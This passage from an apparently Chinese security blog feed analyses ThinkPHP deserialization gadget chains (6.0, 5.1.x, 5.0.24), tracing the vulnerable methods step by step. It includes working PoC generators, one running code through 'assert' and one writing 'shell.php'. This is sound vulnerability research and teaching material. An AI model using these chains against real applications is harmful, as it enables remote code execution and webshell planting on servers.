class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Adapter</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapter</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">"shell.php"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adapter</span> <span class="token operator">=</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Local</span>     <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$writeFlags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//对应file_put_contents的第三个参数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>Local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">(</span><span class="token variable">$local</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X反序列化利用链.md" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X反序列化利用链.md</a></p><p>2.<a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2反序列化/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2反序列化/</a></p><p>3.<a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x反序列化/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x反序列化/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;安装tp6.0&lt;/p&gt;
&lt;pre class=&quot; language-shell&quot;&gt;&lt;cod
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.x反序列化链分析</title>
    <link href="http://yoursite.com/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-09T09:44:33.456Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>利用composer下载tp5.1.37的环境</p><pre class=" language-shell"><code class="language-shell">composer create-project --prefer-dist topthink/think thinkphp5.1.37cd thinkphp5.1.37修改composer.json文件里的为：topthink/framework": "5.1.37保存退出执行：composer update</code></pre><p>要进行反序列化攻击，需要可控的unserialize，在index控制器中写入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    </code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>这条链的前面部分跟tp5.0.24那条链一样，先全局查找__destruct魔术方法，找到文件<code>/thinkphp/library/think/process/pipes/Windows.php</code></p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进removeFiles方法，file_exists函数执行会把里里面的参数当做字符串，所以可以调用__toString魔术方法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里，全局查找__toString，这里存在两条链，我们利用<code>\thinkphp\library\think\model\concern\Conversion.php</code>这条链来构造，这里要怎么调用到__toString方法，而Conversion类是trait关键字声明的，无法被实例化。在类中，可以使用use关键字来继承这个Conversion类，全局查找Conversion类，发现<code>\thinkphp\library\think\Model.php</code></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/1.png" alt="" loading="lazy"></p><p>抽象类不能被实例化，需要找他的子类，发现<code>\thinkphp\library\think\model\Pivot.php</code>，所以payload为：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><p>继续跟进__toString魔术方法中toJson-&gt;toArray()方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/2.png" alt="" loading="lazy"></p><p>当$relation可控的时候可以触发__call方法，这里，$this-&gt;append可控就代表key和name可控，跟进getRelation方法看一下</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/3.png" alt="" loading="lazy"></p><p>当条件语句都不满足无任何返回，就继续跟进getAttr方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/4.png" alt="" loading="lazy"></p><p>这里始终都会执行getData，跟进这个函数</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/5.png" alt="" loading="lazy"></p><p>$this-&gt;data可控，就代表$relation变量可控，所以就可以触发__call方法，全局查找一下。这里可以利用tprce那个那个类来触发命令执行。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/6.png" alt="" loading="lazy"></p><p>这里$this-&gt;hook[$method]是可控，而array_unshift函数会在$args数组前插入新元素，所以导致$args不可控，分析过tp5rce的都知道filterValue方法存在call_user_func可以构造rce。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/7.png" alt="" loading="lazy"></p><p>这里，怎么执行到filterValue，该类的input方法可以调用，但是input方法的参数不可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/8.png" alt="" loading="lazy"></p><p>需要查找哪里调用input方法了，发现param调用了input</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/9.png" alt="" loading="lazy"></p><p>这里$this-&gt;param可控，而name不可控，又需要查找哪里调用param方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isAjax</span><span class="token punctuation">(</span><span class="token variable">$ajax</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$value</span>  <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string">'HTTP_X_REQUESTED_WITH'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string">'xmlhttprequest'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">===</span> <span class="token variable">$ajax</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$result</span>           <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'var_ajax'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mergeParam</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>找到isAjax方法，$this-&gt;config可控，就代表param方法中的name参数可控，就代表input方法中data，name参数都可控，继续回到input方法查看第1373行，在filterValue方法$filters参数要可控</p><pre class=" language-php"><code class="language-php"><span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>跟进getFilter方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/10.png" alt="" loading="lazy"></p><p>$this-&gt;filter可控就代表了filterValue方法$filters参数可控，所以组合起来，poc如下</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token string">"123456"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$param</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"assert"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"var_ajax"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"visible"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"phpinfo()"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/11.png" alt="" loading="lazy"></p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h4><p>不同版本生成的exp不同，如下是影响版本：</p><pre><code>5.1.3 &lt; tp &lt; 5.1.37</code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x反序列化" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x反序列化</a></p><p>2.<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md</a></p><p>3.<a href="https://paper.seebug.org/1040/" target="_blank" rel="noopener">https://paper.seebug.org/1040/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;利用composer下载tp5.1.37的环境&lt;/p&gt;
&lt;pre class=&quot; lang
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.0.24反序列化漏洞分析</title>
    <link href="http://yoursite.com/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-05-06T16:00:00.000Z</published>
    <updated>2020-05-07T07:34:44.194Z</updated>
    
    <content type="html"><![CDATA[<p>这个洞的利用需要利用tp进行二次开发，当unserialize的参数可控，既可触发这个洞。在index控制器中写入：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">'Welcome to ThinkPHP!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="POP链构造分析"><a href="#POP链构造分析" class="headerlink" title="POP链构造分析"></a><strong>POP链构造分析</strong></h4><p>首先，进行全局搜索__destruct，查看thinkphp/library/think/process/pipes/Windows.php的Windows类中调用了__destruct魔术方法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进removeFiles，发现file__exists函数，file__exists处理的时候会将当作字符串来处理，所以可以调用__toString，全局搜索__toString。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进toJson</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">toJson</span><span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">JSON_UNESCAPED_UNICODE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进toArray方法，这里发现三处可以触发__call方法。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/1.png" alt="" loading="lazy"></p><p>经过分析最后一处的参数可控，可以调用__call方法，要执行到这里，要满足如下条件：</p><p>$this-&gt;append可控且为数组，进入下面关键两行代码。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$modelRelation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$relation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getRelationData</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$relation由$this-&gt;append控制，这里需要找个可控的点，在Model方法中getError方法可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进getRelationData方法，要满足if语句的条件就可以让value可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/2.png" alt="" loading="lazy"></p><p>通过全局搜索isSelfRelation，发现isSelfRelation方法是类Relation，而HasOne，OneToOne是Relation的子类，所以$modelRelation可以实例化HasOne类，继续都下面的代码，要满足：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">,</span> <span class="token string">'getBindAttr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>全局搜索getBindAttr，发现OneToOne中存在此方法，发现bindAttr可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBindAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>最后value可控，执行<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就可以调用到__call方法，全局查看__call，漏洞触发点在thinkphp/library/think/console/Output.php</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/3.png" alt="" loading="lazy"></p><p>跟进搜索block方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">block</span><span class="token punctuation">(</span><span class="token variable">$style</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeln</span><span class="token punctuation">(</span><span class="token string">"&lt;{$style}>{$message}&lt;/$style>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进writeln，在跟进write</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/4.png" alt="" loading="lazy"></p><p>这里发现$this-&gt;handle可控，可以进行全局搜索wirte方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/5.png" alt="" loading="lazy"></p><p>找到thinkphp/library/think/session/driver/Memcached.php文件中存在write方法，且$this-&gt;handle可控，继续全局查找set方法，在文件thinkphp/library/think/cache/driver/File.php发现存在写入文件。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/6.png" alt="" loading="lazy"></p><p>这里跟进getCacheKey方法，查看filename是否可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/7.png" alt="" loading="lazy"></p><p>这里$this-&gt;options可控，目前filename可控了，现在就只需要写入的data可控了，跟进setTagItem方法看一下，发现又执行了一次set。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/8.png" alt="" loading="lazy"></p><p>发现value的值就为传进来的filename。最后，整个的pop链就分析完了，贴上<a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">安全客的一篇文章</a></p><p>的pop链图。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/9.png" alt="" loading="lazy"></p><p>最后，poc如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token 